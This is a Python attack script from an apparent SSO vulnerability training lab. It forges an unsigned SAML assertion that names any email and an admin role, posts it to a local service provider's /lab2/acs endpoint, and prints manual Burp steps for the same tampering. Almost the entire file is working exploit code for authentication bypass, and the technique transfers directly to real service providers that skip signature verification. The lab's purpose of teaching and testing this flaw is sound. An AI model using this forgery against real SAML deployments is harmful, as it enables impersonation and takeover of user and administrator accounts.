#!/usr/bin/env python3
"""
==============================================================
 SSO Vuln Lab — Attack: Lab 2 — SAML Signature Bypass
==============================================================
 Target:  http://localhost:3000/lab2/acs
 Goal:    Authenticate as ANY user without valid credentials
          by crafting a hand-forged SAML assertion.
 Impact:  Full authentication bypass — login as any user
 CVSSv3:  10.0 (Critical)

 Root cause:
   SP accepts SAML assertions without any signature verification.
   Any base64-encoded XML is trusted as-is.

 Real HackerOne reports:
   HackerOne #812064 — SAML bypass via missing sig check
   HackerOne #896316 — No signature required on assertions
==============================================================
"""

import sys, base64, uuid, time, requests
from lxml import etree

SP_URL = "http://localhost:3000"

def forge_saml_assertion(target_email, target_role="admin",
                          target_name="Forged User"):
    """
    Build a completely fake SAML Response with no signature.
    The vulnerable SP at /lab2/acs will accept this.
    """
    now    = "2024-01-01T00:00:00Z"
    expiry = "2099-01-01T00:00:00Z"
    resp_id   = "_" + uuid.uuid4().hex
    assert_id = "_" + uuid.uuid4().hex
    acs_url   = f"{SP_URL}/lab2/acs"

    xml = f"""<samlp:Response
  xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
  ID="{resp_id}" Version="2.0"
  IssueInstant="{now}" Destination="{acs_url}">
  <saml:Issuer>http://saml-idp:8080/saml/metadata</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="{assert_id}" Version="2.0" IssueInstant="{now}">
    <saml:Issuer>http://saml-idp:8080/saml/metadata</saml:Issuer>
    <!-- NO SIGNATURE — SP doesn't check -->
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress"
        >{target_email}</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="{expiry}"
          Recipient="{acs_url}"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="{now}" NotOnOrAfter="{expiry}">
      <saml:AudienceRestriction>
        <saml:Audience>http://vulnerable-saml-sp:3000</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AttributeStatement>
      <saml:Attribute Name="email">
        <saml:AttributeValue>{target_email}</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="role">
        <saml:AttributeValue>{target_role}</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="displayName">
        <saml:AttributeValue>{target_name}</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="uid">
        <saml:AttributeValue>forged-{uuid.uuid4().hex[:6]}</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>"""
    return xml, base64.b64encode(xml.encode()).decode()

def attack(target_email, target_role):
    print(f"""
╔══════════════════════════════════════════════════════╗
║  LAB 2 — SAML Signature Bypass                      ║
║  Target: {target_email:<40} ║
╚══════════════════════════════════════════════════════╝
""")
    print(f"[*] Forging SAML assertion for {target_email} (role: {target_role})")

    xml, b64 = forge_saml_assertion(target_email, target_role)

    print(f"[*] Forged XML (first 300 chars):\n{xml[:300]}...")
    print(f"\n[*] Submitting forged assertion to /lab2/acs")

    session = requests.Session()
    r = session.post(f"{SP_URL}/lab2/acs", data={
        "SAMLResponse": b64,
        "RelayState":   "lab2",
    }, allow_redirects=True)

    print(f"[*] Response: {r.status_code} — URL: {r.url}")

    if "dashboard" in r.url or target_email in r.text:
        print(f"\n[✓] SIGNATURE BYPASS SUCCESSFUL!")
        print(f"[✓] Authenticated as: {target_email}")
        print(f"[✓] Role: {target_role}")
        if "Admin access granted" in r.text:
            print("[!] 🚨 ADMIN ACCESS CONFIRMED!")
    else:
        print(f"\n[?] Response body:\n{r.text[:500]}")

    # Also show Burp one-liner
    print(f"""
[Manual Burp Steps]:
  1. Go to /lab2/login → intercept SAMLResponse in Burp
  2. Base64-decode the SAMLResponse
  3. Edit NameID to: {target_email}
  4. Edit role attribute to: {target_role}
  5. Re-base64-encode (no re-sign needed!)
  6. Forward → authenticated as {target_email}

[Base64 Payload]:
{b64[:100]}...
""")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "alice@lab.local"
    role   = sys.argv[2] if len(sys.argv) > 2 else "admin"
    attack(target, role)
